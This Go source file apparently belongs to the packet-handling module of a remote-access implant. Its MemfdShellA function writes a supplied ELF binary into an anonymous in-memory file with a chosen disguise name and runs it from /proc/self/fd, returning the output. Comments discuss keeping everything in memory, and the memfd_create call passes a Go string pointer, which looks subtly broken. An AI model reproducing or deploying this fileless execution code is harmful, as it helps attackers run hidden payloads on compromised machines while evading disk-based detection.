package HandlePacket

import (
	"errors"
	"fmt"

	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/execabs"
)

func MemfdShellA(elf []byte, args []string, hideName string) (string, string) {
	var stdOut, stdErr string
	memfd := New(hideName)
	memfd.Write(elf)
	stdOut, err := memfd.Cmd(args)
	if err != nil {
		stdErr = fmt.Sprintf("%s", err.Error())
		return "", stdErr
	}
	return stdOut, stdErr
}

var errTooBig = errors.New("[error] memfd too large for slice")

const maxint int64 = int64(^uint(0) >> 1)

const (
	MFD_CREATE  = 319
	MFD_CLOEXEC = 0x0001
)

type MemFD struct {
	*os.File
}

func New(name string) *MemFD {
	fd, _, _ := syscall.Syscall(MFD_CREATE, uintptr(unsafe.Pointer(&name)), uintptr(MFD_CLOEXEC), 0)
	return &MemFD{
		os.NewFile(fd, name),
	}
}

func (self *MemFD) Write(bytes []byte) (int, error) {
	return syscall.Write(int(self.Fd()), bytes)
}

func (self *MemFD) Path() string {
	return fmt.Sprintf("/proc/self/fd/%d", self.Fd())
}

func (self *MemFD) Info() (os.FileInfo, error) {
	return os.Lstat(self.Path())
}

// Readlink returns the destination of the named symbolic link.
func Readlink(path string, buf []byte) (n int, err error) {
	return syscall.Readlink(path, buf)
}

func (self *MemFD) Execute(arguments []string) (int, uintptr, error) {
	//user, _ := user.Current()
	//uid, _ := strconv.Atoi(user.Uid)
	//guid, _ := strconv.Atoi(user.Gid)

	//var tempFile os.File
	//baseCmd.SetExtraFiles([]*os.File{&tempFile})

	wd, _ := os.Getwd()
	procAttr := &syscall.ProcAttr{
		Dir: wd,
		Files: []uintptr{
			os.Stdin.Fd(),
			os.Stdout.Fd(),
			os.Stderr.Fd(),
		},
		Env: os.Environ(),
		Sys: &syscall.SysProcAttr{
			//Chroot: "", // Chroot: Could create a tmpfs and chroot into that so everything is in memory
			//Credential: &syscall.Credential{
			//	Uid:    1000,
			//	Gid:    1000,
			//	Groups: []uint32{1000},
			//}, // Credential
			Ptrace:  false, // Enable tracing
			Setsid:  true,  // Create session
			Setpgid: false, // Set process group ID to new pid (SYSV setpgrp)
			Setctty: false, // Set controlling terminal to fd 0
			Noctty:  false, // Detach fd 0 from controlling terminal
		},
	}
	//return syscall.StartProcess(self.Path(), append([]string{self.Name(), " "}, arguments...), procAttr)

	// NOTE: This works, using system 'echo', and this, the extra quotes MUST be
	// ommited
	//command := []string{self.Name(), "-e", "p 'echo test'"}
	//command := []string{self.Name(), "-e", "system 'echo test'"}
	// NOTE: Using this type of execution means that anything after this is NOT ran in this software, because
	// the process is replaced with this new process. This is why putting fmt.Print commands after the exec
	// call here does not print.
	//return syscall.Exec(self.Path(), append([]string{self.Name()}, arguments), os.Environ())
	return self.ExecuteWithAttributes(procAttr, arguments)
	// pid, handle, error
}

func (self *MemFD) ExecuteWithAttributes(procAttr *syscall.ProcAttr, arguments []string) (int, uintptr, error) {
	return syscall.StartProcess(self.Path(), append([]string{self.Name()}, arguments...), procAttr)
}

func (self *MemFD) Cmd(arguments []string) (string, error) {
	cmd := execabs.Command(self.Path(), arguments...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		//Chroot: "", // Chroot: Could create a tmpfs and chroot into that so everything is in memory
		//Credential: &syscall.Credential{
		//	Uid:    1000,
		//	Gid:    1000,
		//	Groups: []uint32{1000},
		//}, // Credential
		Ptrace:  false, // Enable tracing
		Setsid:  true,  // Create session
		Setpgid: false, // Set process group ID to new pid (SYSV setpgrp)
		Setctty: false, // Set controlling terminal to fd 0
		Noctty:  false, // Detach fd 0 from controlling terminal
	}
	stdout, stderr := cmd.CombinedOutput()
	return string(stdout), stderr
}
